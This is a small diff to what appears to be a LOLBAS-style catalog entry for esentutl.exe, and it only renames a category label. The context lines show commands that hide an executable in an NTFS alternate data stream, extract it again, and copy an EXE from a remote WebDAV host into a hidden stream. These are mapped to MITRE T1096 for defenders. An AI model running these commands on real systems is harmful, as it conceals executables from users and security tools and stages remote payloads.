@@ -15,7 +15,7 @@ Commands:
   - Command: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o
     Description: Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
     Usecase: Copy file and hide it in an alternate data stream as a defensive counter measure
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
@@ -23,7 +23,7 @@ Commands:
   - Command: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o
     Description: Copies the source Alternate Data Stream (ADS) to the destination EXE.
     Usecase: Extract hidden file within alternate data streams
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
@@ -31,7 +31,7 @@ Commands:
   - Command: esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
     Description: Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.  
     Usecase: Copy file and hide it in an alternate data stream as a defensive counter measure
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1096
     MitreLink: https://attack.mitre.org/wiki/Technique/T1096
